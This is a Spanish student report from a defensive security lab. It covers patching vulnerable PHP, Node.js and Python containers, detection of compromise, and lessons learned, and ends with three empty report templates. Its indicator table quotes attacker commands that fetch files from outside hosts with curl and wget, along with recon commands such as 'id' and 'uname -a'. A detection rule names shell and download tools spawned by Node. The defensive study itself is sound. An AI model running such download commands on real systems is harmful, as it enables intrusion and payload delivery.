# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** _Ulises Mateo Bucchino_
**Usuario de GitHub:** _ulisesutnfrlp7_
**Rol en el TP:** _cambios-parche_
**Fecha:** 29/10/2026
**Grupo:** 08

---

## 1. Situación y riesgo

Durante el laboratorio defensivo se identificaron tres servicios vulnerables en una red aislada (`labnet`, `internal: true`):

| Servicio | Versión inicial | Hallazgo principal | Riesgo |
|----------|----------------|--------------------|--------|
| Portal PHP | PHP 8.3.35 (cli, NTS) | `session.upload_progress.enabled = 1` habilitado | RCE mediante técnica conocida en PHP < 8.3.36 |
| API Node.js | Node v22.23.3 | brotli 1.1.0 aportado por el runtime | Dependencia desactualizada; posible vector secundario |
| Servicio Python | Python 3.11.18 | brotli 1.0.9 | Dependencia desactualizada |

El activo más crítico es el Portal PHP: la función de progreso de subida de sesiones puede ser abusada para ejecución remota de código (RCE) en versiones anteriores a 8.3.36. Como los contenedores no publican puertos y operan sobre red interna sin salida a Internet, la exposición real es limitada, pero el riesgo de movimiento lateral dentro del laboratorio es real si un atacante logra compromiso inicial.

## 2. Plan priorizado

Se aplicó la siguiente priorización (matriz en `entrega.md`, sección 2):

1. **Portal PHP (Alta):** Mitigación inmediata (`session.upload_progress.enabled = 0` en `laboratorio/php/php.ini`, reinicio de `php-lab`, verificación con `ini_get()` → `0`). Parche de versión a PHP 8.3.36 mediante `./scripts/parchear.sh`.
2. **API Node.js (Media):** Parche a Node v22.23.4 con `./scripts/parchear.sh`. Revisar dependencias con brotli.
3. **Servicio Python (Media):** Actualización a Python 3.11.18 con brotli 1.2.1 mediante `./scripts/parchear.sh`.

**Reversión documentada:** `git checkout -- laboratorio/php/php.ini` y volver a tags anteriores con `PHP_TAG`/`NODE_TAG` en `versions.env`.

## 3. Indicadores de compromiso (IoC)

A partir de `audit.log` y `./scripts/detectar.sh`, se identificaron los siguientes hallazgos de caza:

| Timestamp | Host | Padre → hijo | Comando sospechoso | Estado |
|-----------|------|--------------|-------------------|--------|
| 2026-10-27T09:42:17Z | web01 | apache2 → sh | `sh -c id` | Compromiso |
| 2026-10-27T09:43:03Z | api01 | node → sh | `sh -c curl http://198.51.100.7/x` | Compromiso |
| 2026-10-27T09:44:22Z | web01 | apache2 → wget | `wget http://198.51.100.9/a` | Compromiso |
| 2026-10-27T09:45:10Z | svc01 | python → sh | `sh -c uname -a` | Compromiso |

**Regla de detección propuesta (Node.js):** alerta cuando `ppid_comm = node` y `comm ∈ {sh, bash, curl, wget}`. Falso negativo posible si el atacante usa `child_process.exec` sin spawn de shell visible.

**Limitaciones:** el log no registra usuario de origen del atacante ni IP de origen; solo IPs destino (`198.51.100.7`, `198.51.100.9`).

## 4. Transferencia a una CVE distinta (ej. CVE-2026-115560)

Supongamos una vulnerabilidad hipotética **CVE-2026-115560** en un motor de plantillas de Node.js que permite inyección de comandos mediante cabeceras HTTP maliciosas.

- **Similitud con el TP:** al igual que `session.upload_progress.enabled = 1` en PHP, CVE-2026-115560 expone una funcionalidad legítima (procesamiento de plantillas) que puede ser abusada para ejecución remota.
- **Diferencia:** en el TP la mitigación fue deshabilitar una opción de configuración (`session.upload_progress.enabled = 0`); en CVE-2026-115560 la mitigación sería actualizar el motor de plantillas a una versión parcheada y validar/sanitizar cabeceras de entrada.
- **Lección transferible:** en ambos casos, la mitigación de configuración (deshabilitar función innecesaria) es un control inmediato mientras se espera el parche de versión.

## 5. Lecciones aprendidas

1. **Mitigación antes del parche:** deshabilitar una opción de configuración riesgosa (`session.upload_progress.enabled`) reduce el riesgo inmediatamente, sin esperar la ventana de cambio del viernes.
2. **Contención en profundidad:** `internal: true`, `read_only`, `cap_drop: ALL`, usuarios sin privilegios y límites de memoria/PIDs forman capas independientes que limitan el daño incluso si un servicio es comprometido.
3. **Detección sin contexto completo:** los logs de procesos revelan comportamiento anómalo (padre→hijo), pero carecen de usuario/IP de origen; se necesitan múltiples fuentes de telemetría para investigación forense completa.
4. **Documentación como evidencia:** pegar outputs de comandos (`inventario.sh`, `parchear.sh`, `detectar.sh`, `verificar-contencion.sh`) directamente en los entregables evita reconstrucciones imprecisas al final del TP.
5. **Comunicación con gerencia:** hay que traducir riesgos técnicos a impacto de negocio (disponibilidad, confidencialidad) sin dar detalles que ayuden a un atacante.

## 6. Qué no se pudo probar

- Acceso real desde red externa al laboratorio (no hay salida a Internet ni proxy público en el entorno aislado).
- Explotación activa de las vulnerabilidades (el TP prohíbe exploits/PoCs; solo se trabajó con contenedores de la cátedra).

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** -
**Usuario de GitHub:** -
**Rol en el TP:** -
**Fecha:** -
**Grupo:** 08

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** -
**Usuario de GitHub:** -
**Rol en el TP:** -
**Fecha:** -
**Grupo:** 08

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

# Informe individual — TP PHP2Shell / Node2Shell

**Integrante:** -
**Usuario de GitHub:** -
**Rol en el TP:** -
**Fecha:** -
**Grupo:** 08